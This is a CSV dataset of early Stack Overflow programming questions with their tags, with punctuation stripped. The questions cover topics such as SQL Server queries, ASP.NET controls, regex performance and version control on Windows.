Id,Title,Tag
3180,anyone soloing using fogbugz is there anyone working solo and using fogbugz out there im interested in personal experienceoverhead versus paperi am involved in several projects and get pretty hammered with lots of details to keep track of any experience welcomeyes i know mr joel is on the stackoverflow team i still want good answers ,fogbugz
3230,how do you pack a visual studio c project for release im wondering how to make a release build that includes all necessary dll files into the exe so the program can be run on a nondevelopment machine without it having to install the microsoft redistributable on the target machinewithout doing this you get the error message that the application configuration is not correct and to reinstall  ,c++
3260,peak detection of measured signal we use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value to find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculationsthis works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak we take 10 readings a second from 16 devices over a 90 second periodmy initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system is this the best way to proceed or are there better techniqueswe do use labview and i have checked the lava forums and there are a number of interesting examples this is part of our test software and we are trying to avoid using too many nonstandard vi libraries so i was hoping for feedback on the processalgorithms involved rather than specific code ,algorithm
3400,how do you get leading wildcard fulltext searches to work in sql server note i am using sqls fulltext search capabilities contains clauses and all  the  is the wildcard in fulltext  is for like clauses onlyive read in several places now that leading wildcard searches eg using overflow to match stackoverflow is not supported in ms sql  im considering using a clr function to add regex matching but im curious to see what other solutions people might havemore info you can add the asterisk only at the end of the word or phrase  along with my empirical experience  when matching myvalue my works but asteriskvalue returns no match when doing a query as simple asselect  from tablename where containstextcolumn searchtermthus my need for a workaround  im only using search in my site on an actual search page  so it needs to work basically the same way that google works in the eyes on a joe sixpacktype user not nearly as complicated but this sort of match really shouldnt fail,sql-server
3470,how do i transform sql columns into rows i have a very simple problem which requires a very quick and simple solution in sql server 2005i have a table with x columns i want to be able to select one row from the table and then transform the columns into rowstableacolumn1 column2 column3sql statement to ruturnresultavalue of column1value of column2value of column3kevin ive had a google search on the topic but alot of the example where overly complex for my example are you able to help furthermario the solution i am creating has 10 columns which stores the values 0 to 6 and i must work out how many columns have the value 3 or more so i thought about creating a query to turn that into rows and then using the generated table in a subquery to say count the number of rows with column  3,sql-server
3510,what does the term bodmas mean what is bodmas and why is it useful in programming,math
3530,how do i run rake tasks within a ruby script i have a rakefile with a rake task that i would normally call from the command linerake blogpost titleid like to write a ruby script that calls that rake task multiple times but the only solution i see is shelling out using  backticks or systemwhats the right way to do this,ruby
3790,is there a wmi redistributable package ive been working on a project that accesses the wmi to get information about the software installed on a users machine weve been querying win32product only to find that it doesnt exist in 64bit versions of windows because its an optional componenti know there are a lot of really good alternatives to querying the wmi for this information but ive got a bit of a vested interest in finding out how well this is going to work outwhat i want to know is if theres some kind of redistributable that can be packaged with our software to allow 64bit users to get the wmi installer provider put onto their machines right now they have to install it manually and the installation requires they have their windows disc handyedit  you didnt mention for what os but the wmi redistributable components version 10 definitely existsfor operation system weve been using net 35 so we need packages that will work on xp64 and 64bit versions of windows vista,windows
4080,what code analysis tools do you use for your java projects what code analysis tools do you use on your java projectsi am interested in all kindsstatic code analysis tools findbugs pmd and any otherscode coverage tools cobertura emma and any othersany other instrumentationbased tools anything else if im missing somethingif applicable also state what build tools you use and how well these tools integrate with both your ides and build tools if a tool is only available a specific way as an ide plugin or say a build tool plugin that information is also worth noting,java
4110,what program can i use to generate diagrams of sql viewtable structure ive been tasked with redesigning part of a mssql database structure which currently involves a lot of views some of which contain joins to other views anyway i wonder if anyone here could recommend a utility to automatically generate diagrams to help me visualise the whole structurewhats the best program youve used for such problems,sql
4170,how to learn adonet i need to learn adonet to build applications based on ms office i have read a good deal about adonet in the msdn library but everything seems rather messy to mewhat are the basics one must figure out when using adonet i think a few key words will suffice to let me organize my learning,ado.net
4230,the difference between a datagrid and a gridview in aspnet ive been doing aspnet development for a little while now and ive used both the gridview and the datagrid controls before for various things but i never could find a really good reason to use one or the other id like to knowwhat is the difference between these 2 aspnet controls what are the advantages or disadvantages of both is one any faster newer easier to maintainthe intellisense summary for the controls doesnt seem to describe any difference between the two they both can view edit and sort data and automatically generate columns at runtimeedit visual studio 2008 no longer lists datagrid as an available control in the toolbox it is still available for legacy support i assume if you type it in by hand though,asp.net
4320,aspnet 20 application without business logic layer is it acceptable to have an aspnet 20 application without the bll business logic layer as the followingsql server data storage amp stored proceduresdata link layer strongly typed table adapters connecting to stored procspresentation layer aspx pages with code behind and objectdatasource for connection straight to the dllis a bll always preferable even if business logic is entirely validatable in the presentations code behind  what are the potential drawbacks for not using a bll,asp.net
4430,how to easily consume a web service from php is there available any tool for php which can be used to generate code for consuming a web service based on its wsdl something comparable to clicking add web reference in visual studio or the eclipse plugin which does the same thing for java,php
4610,how can i create prototype methods like javascript in cnet how is it possible to make prototype methods in cnetin javascript i can do the following to create a trim method for the string objectstringprototypetrim  function     return thisreplacessghow can i go about doing this in cnet,c#
4630,how can i java webstart multiple dependent native libraries example i have two shared objects same should apply to dlls the first shared object is from a thirdparty library well call it libaso i have wrapped some of this with jni and created my own library libbso now libb depends on libawhen webstarting both libraries are places in some webstart working area my java code attempts to load libb at this point the system loader will attempt to load liba which is not in the system library path javalibrarypath wont help this the end result is that libb has an unsatisfied link and cannot be used i have tried loading liba before libb but that still does not work seems the os wants to do that loading for me is there any way i can make this work other than statically  compiling,java
4670,dvcs choices  whats good for windows so i want to get a project on a distributed version control system such as mercurial git or bazaar  the catch is that i need the windows support to be good ie no instructions that start off with install cygwin  now ive heard that gits windows support is decent these days but dont have any first hand experience  also it sounds like the bazaar team has an explicit goal of making it as multiplatform as possiblecan i get any recommendations,version-control
4850,c and arrow keys i am new to c and am doing some work in an existing application i have a directx viewport that has components in it that i want to be able to position using arrow keyscurrently i am overriding processcmdkey and catching arrow input and send an onkeypress event this works but i want to be able to use modifiersaltctrlshift as soon as i am holding a modifier and press an arrow no events are triggered that i am listening todoes anyone have any ideas or suggestions on where i should go with this,c#
4860,authoritative source on xmlsig we have a question with regards to xmlsig and need detail about the optional elements as well as some of the canonicalization and transform stuff  were writing a spec for a very small xmlsyntax payload that will go into the metadata of media files and it needs to by cryptographically signed  rather than reinvent the wheel we thought we should use the xmlsig spec but i think most of it is overkill for what we need and so we like to have more informationdialogue with people who know the detailsspecifically do we need to care about either transforms or canonicalization if the xml is very basic with no tabs for formatting and is specific to our needs,xml
4870,why is this regular expression faster im writing a telnet client of sorts in c and part of what i have to parse are ansivt100 escape sequences specifically just those used for colour and formatting detailed hereone method i have is one to find all the codes and remove them so i can render the text without any formatting if needed    public static string stripstringformatingstring formattedstring    if rtestismatchformattedstring        return rtestreplaceformattedstring stringempty    else        return formattedstringim new to regular expressions and i was suggested to use thisstatic regex rtext  new regexedm regexoptionscompiledhowever this failed if the escape code was incomplete due to an error on the server so then this was suggested but my friend warned it might be slower this one also matches another condition z that i might come across laterstatic regex rtest                new regexedmz regexoptionscompiledthis not only worked but was in fact faster to and reduced the impact on my text rendering can someone explain to a regexp newbie why ,regex
4880,is a confirm email input good practice when user changes email address my organization has a form to allow users to update their email address with usits suggested that we have two input boxes for email the second as an email confirmationi always copypaste my email address when faced with the confirmationim assuming most of our users are not so savvyregardless is this considered a good practicei cant stand it personally but i also realize it probably isnt meant for meif someone screws up their email they cant login and they must call to sort things out,html
4930,how to reference to multiple version assembly im developing a sharepoint application and use net ajaxcontroltoolkit library we are adding a custom aspx page to the sharepoint sharepoint 2007 run in quirks mode so ive made some modification to the ajax library to make it behave like it normally should the problem is the other team already use ajax library and it is a different version with mine this cause conflict because there could be only one dll in the bin folder with the same namefrom what i know net should be able to handle this situation easily ive tried using strong name and gac to solve it but it still refer to the dll in the bin folder if there is no ajaxcontroltoolkitdll in the bin folder the application will simply fail to load the assembly if i use complete assembly information on my like this lt     register     tagprefixajaxcontroltoolkit    namespaceajaxcontroltoolkit    assemblyajaxcontroltoolkit version1029918064     publickeytoken12345678abcdefgh     cultureneutralgtit gives me compiler error cs0433can someone help me on how to use multiple version of assembly in an application,c#
5170,sql server management studio alternatives to browseedit tables and run queries i was wondering if there are any alternatives to microsofts sql server management studionot theres anything wrong with ssms but sometimes it just seem too big an application where all i want todo is browseedit tables and run queries,sql-server
5260,what is the best way to wrap time around the work day i have a situation where i want to add hours to a date and have the new date wrap around the workday i cobbled up a function to determine this new date but want to make sure that im not forgetting anythingthe hours to be added is called delay it could easily be a parameter to the function insteadplease post any suggestions vbnet warningprivate function getdaterequired as date     a decimal representation of the current hour    dim hours as decimal  decimalparsedatenowhour  decimalparsedatenowminute  600     dim delay as decimal  30            delay in hours    dim endofday as decimal  120  50  end of day in hours    dim startofday as decimal  80       start of day in hours    dim newhour as integer    dim newminute as integer    dim daterequired as date  now    dim delta as decimal  hours  delay     wrap around to the next day if necessary    if delta gt endofday then        delta  delta  endofday        daterequired  daterequiredadddays1        newhour  integerparsedecimaltruncatedelta        newminute  integerparsedecimaltruncatedelta  newhour  60        newhour  startofday  newhour    else        newhour  integerparsedecimaltruncatedelta        newminute  integerparsedecimaltruncatedelta  newhour  60    end if    daterequired  new datedaterequiredyear daterequiredmonth daterequiredday newhour newminute 0    return daterequiredend subnote this will probably not work if delay is more than 9 hours long it should never change from 3 througheditthe goal is find the date and time that you get as a result of adding several hours to the current time this is used to determine a default value for a due date of a submission i want to add 3 hours to the current time to get the due date time however i dont want due dates that go beyond 5pm on the current day so i tried to have the hours split between today up to 5pm and tomorrow from 8am on such that adding 3 hours to 4pm would give you 19am because 1 hour is added to the end of today and 2 hours are added to the beginning of tomorrow,vb.net
5460,telligents community server the company i work for is wanting to add blog functionality to our website and they were looking to spend an awful amount of money to have some crap being built on top of a cms they purchased sitecore  i pointed them to telligents community server and  we had a sales like meeting today to get the marketing folks on board my question is if anyone has had issues working with community server skinning it and extending iti wanted to explain a bit why i am thinking community server the company is wanting multiple blogs with multiple authors  i want to be out of the admin part of this as much as possible and didnt think there were too many engines that having multiple blogs didnt mean db work  i also like the other functionality that community server provides and think the company will find it useful particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuffedit we are actually using the sitecore blog module for a single blog on our intranet which is actually what the cms is serving  some reasoning for why i dont like it for our public site are they are on different servers it doesnt support multiple authors there is no built in syndication it is a little flimsy feeling to me from looking at the source and i personally think the other features of community server make its price tag worth itanother edit need to stick to net software that run on sql server in my companys case but i dont mind seeing recommendations for others  expressionengine looks promising will try it out on my personal box,community-server
5600,tables with no primary key i have several tables whose only unique data is a uniqueidentifier a guid column because guids are nonsequential and theyre clientside generated so i cant use newsequentialid i have made a nonprimary nonclustered index on this id field rather than giving the tables a clustered primary keyim wondering what the performance implications are for this approach ive seen some people suggest that tables should have an autoincrementing identity int as a clustered primary key even if it doesnt have any meaning as it means that the database engine itself can use that value to quickly look up a row instead of having to use a bookmarkmy database is mergereplicated across a bunch of servers so ive shied away from identity int columns as theyre a bit hairy to get right in replicationwhat are your thoughts should tables have primary keys or is it ok to not have any clustered indexes if there are no sensible columns to index that way,sql-server
5690,mvc preview 4  no route in the route table matches the supplied values i have a route that i am calling through a redirecttoroute like thisreturn thisredirecttoroutesupersuperroute new  year  selectedyear i have also tried return thisredirecttoroutesupersuperroute new  controller  super action  superroute id  routetopic year  selectedyear the route in the globalasax is like thisroutesmaproute    supersuperroute  route name    supermvcsuperrouteyear   url with parameters     new  controller  super action  superroute id  routetopic    parameter defaultsso why do i get the error no route in the route table matches the supplied valuesi saw that the type of selectedyear was var  when i tried to convert to int with intparse i realised that selectedyear was actually null which would explain the problems  i guess next time ill pay more attention to the values of the variables at a breakpoint ,asp.net-mvc
